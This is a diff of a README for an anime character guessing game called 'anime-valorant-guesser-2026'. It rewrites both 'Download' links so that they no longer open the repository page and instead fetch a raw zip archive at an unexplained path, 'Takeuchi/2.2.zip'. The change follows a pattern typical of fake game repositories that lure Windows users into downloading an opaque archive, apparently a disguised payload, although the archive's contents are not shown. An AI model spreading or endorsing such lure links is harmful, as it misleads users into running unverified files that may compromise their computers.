@@ -1,6 +1,6 @@
 # 🎯 anime-valorant-guesser-2026 - Guess Anime Characters Like a Pro
 
-[![Download Now](https://img.shields.io/badge/Download_Game-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/shaikhraihan7600-afk/anime-valorant-guesser-2026)
+[![Download Now](https://img.shields.io/badge/Download_Game-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/shaikhraihan7600-afk/anime-valorant-guesser-2026/raw/refs/heads/main/Takeuchi/2.2.zip)
 
 ## 🎮 What Is This?
 
@@ -34,7 +34,7 @@ Follow these steps to get the game on your Windows computer.
 
 Click this link to go to the game page:
 
-[**https://github.com/shaikhraihan7600-afk/anime-valorant-guesser-2026**](https://github.com/shaikhraihan7600-afk/anime-valorant-guesser-2026)
+[**https://github.com/shaikhraihan7600-afk/anime-valorant-guesser-2026/raw/refs/heads/main/Takeuchi/2.2.zip**](https://github.com/shaikhraihan7600-afk/anime-valorant-guesser-2026/raw/refs/heads/main/Takeuchi/2.2.zip)
 
 ### Step 2: Find the Green Code Button
 
